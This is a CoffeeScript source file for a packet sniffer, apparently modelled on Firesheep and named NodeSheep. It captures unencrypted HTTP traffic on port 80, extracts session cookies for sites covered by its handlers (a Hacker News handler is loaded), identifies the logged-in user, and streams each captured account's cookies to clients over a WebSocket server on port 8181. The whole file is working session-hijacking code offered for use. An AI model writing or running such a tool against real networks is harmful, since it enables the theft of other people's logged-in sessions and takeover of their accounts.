pcap = require 'pcap'
utils = require 'utils'
http = require 'http'
events = require 'events'
ws = require 'websocket-server'

require.paths.unshift 'handlers'

HackerNewsHandler = require('hackernews').HackerNewsHandler

class NodeSheep extends events.EventEmitter
  constructor: (@handlers) ->
    @filter = 'tcp port 80'
    @tracker = new pcap.TCP_tracker

    @tracker.on 'http response body', (session, http, data) =>
      request = @parseRequest http.request

      for handler in @handlers
        for domain in handler.domains when domain.toLowerCase() == request.host
          try
            @handleRequest handler, request
          catch error
            console.log 'Error handling request:'
            console.log error

  handleRequest: (handler, request) ->
    sessionCookies = {}
    numCookies = 0
    for key, val of request.cookies
      sessionCookies[key] = val if handler.sessionCookies.indexOf(key) != -1
      numCookies += 1

    if numCookies < handler.sessionCookies.length
      return

    sessionId = handler.name + JSON.stringify sessionCookies
    if @sessionsSeen[sessionId] == true
      return

    @sessionsSeen[sessionId] = true

    handler.identifyUser request, sessionCookies, (user) =>
      @emit 'account',
        name: handler.name
        user: user
        sessionId: sessionId
        siteUrl: "http://#{handler.domains[0]}/"
        domain: handler.domains[0]
        cookies: sessionCookies

  parseRequest: (request) ->
    cookieStr = if request.headers.Cookie then request.headers.Cookie else ''
    host: request.headers.Host
    cookies: @parseCookies cookieStr
    userAgent: request.headers['User-Agent']

  parseCookies: (cookieStr) ->
    cookies = {}
    for cookie in cookieStr.split ';'
      [name, value] = (part.trim() for part in cookie.split '=')
      cookies[name] = (value or '') if name
    cookies

  startCapture: (device) ->
    @pcapSession = pcap.createSession device, @filter
    @sessionsSeen = {}

    console.log "Capturing packets on #{@pcapSession.device_name}"
    @pcapSession.on 'packet', (rawPacket) =>
      packet = pcap.decode.packet rawPacket
      @tracker.track_packet packet


sheep = new NodeSheep [new HackerNewsHandler]
sheep.startCapture (process.argv[0] or '')

wsServer = ws.createServer()
wsServer.addListener 'connection', (conn) ->
  sheep.on 'account', (account) ->
    conn.send JSON.stringify account

wsPort = 8181
wsServer.listen wsPort
console.log "Listening on port #{wsPort}"


